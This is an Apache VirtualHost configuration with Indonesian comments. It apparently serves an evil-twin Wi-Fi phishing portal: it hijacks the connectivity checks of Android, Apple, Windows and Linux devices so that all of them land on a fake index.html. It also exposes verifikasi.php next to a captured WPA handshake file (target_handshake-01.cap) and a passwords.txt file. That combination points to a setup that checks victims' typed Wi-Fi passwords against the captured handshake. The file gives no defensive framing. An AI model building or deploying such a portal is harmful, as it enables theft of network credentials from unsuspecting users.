<VirtualHost *:80>

    # ========================================
    # Konfigurasi dasar VirtualHost
    # ========================================
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined


    # ========================================
    # Aktifkan fitur mod_rewrite
    # ========================================
    RewriteEngine On


    # ========================================
    # File yang BOLEH diakses langsung
    # Tidak kena redirect sama sekali
    # ========================================
    RewriteCond %{REQUEST_URI} ^/(index\.html|verifikasi\.php|target_handshake-01\.cap|passwords\.txt)$ [NC]
    RewriteRule ^ - [L]


    # ========================================
    # Tangani request ROOT "/"
    # ========================================
    RewriteRule ^$ /index.html [L]


    # ========================================
    # Deteksi Captive Portal OS
    # Semua diarahkan ke index.html
    # ========================================

    # -------- ANDROID --------
    RewriteCond %{REQUEST_URI} ^/(generate_204|gen_204)(/.*)?$ [NC]
    RewriteRule ^ /index.html [L]

    RewriteCond %{HTTP_HOST} ^connectivitycheck\.gstatic\.com$ [NC]
    RewriteRule ^ /index.html [L]


    # -------- APPLE (iOS / macOS) --------
    RewriteCond %{REQUEST_URI} ^/(hotspot-detect\.html|library/test/success\.html)$ [NC]
    RewriteRule ^ /index.html [L]

    RewriteCond %{HTTP_HOST} ^captive\.apple\.com$ [NC]
    RewriteRule ^ /index.html [L]


    # -------- WINDOWS --------
    RewriteCond %{REQUEST_URI} ^/(connecttest\.txt|ncsi\.txt)$ [NC]
    RewriteRule ^ /index.html [L]

    RewriteCond %{HTTP_HOST} ^(msftconnecttest|msftncsi)\.com$ [NC]
    RewriteRule ^ /index.html [L]


    # -------- LINUX --------
    RewriteCond %{REQUEST_URI} ^/check_network_status\.(txt|xml)$ [NC]
    RewriteRule ^ /index.html [L]

    RewriteCond %{HTTP_HOST} ^(nmcheck\.gnome\.org|connectivity-check\.ubuntu\.com)$ [NC]
    RewriteRule ^ /index.html [L]


    # ========================================
    # RULE TERAKHIR (fallback)
    # ========================================
    RewriteRule ^ /index.html [L]

</VirtualHost>
